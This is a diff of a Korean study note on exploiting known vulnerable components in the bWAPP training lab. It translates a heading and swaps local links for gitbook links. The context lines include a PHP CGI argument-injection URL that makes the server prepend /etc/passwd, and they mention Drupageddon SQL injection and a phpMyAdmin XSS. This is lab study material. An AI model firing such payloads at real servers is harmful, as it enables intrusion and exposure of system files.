@@ -1,4 +1,4 @@
-# A9 UsingKnownVulnerableComponents
+# A9 알려진 취약 컴포넌트 공격
 
 ## Drupal SQL Injection (Drupageddon)
 
@@ -8,7 +8,7 @@
 
 ## PHP CGI Remote Code Execution
 
-* 참조: [CGI](file:///2237607/web/CGI.md)
+* 참조: [CGI](https://krjaeh0.gitbook.io/j-log/programming/cs_basics/web_technologies/web-basics/cgi)
 
 http://<target-ip>/bWAPP/admin/phpinfo.php
 
@@ -21,7 +21,7 @@ http://<target-ip>/bWAPP/admin/?-d+auto\_prepend\_file%3d/etc/passwd
 
 ## phpMyAdmin BBCode Tag XSS
 
-* 참조: [BBCode](file:///2237607/web/BBCode.md)
+* 참조: [BBCode](https://krjaeh0.gitbook.io/j-log/programming/cs_basics/web_technologies/web-basics/bbcode)
 
 http://<target-ip>/phpmyadmin/error.php
 
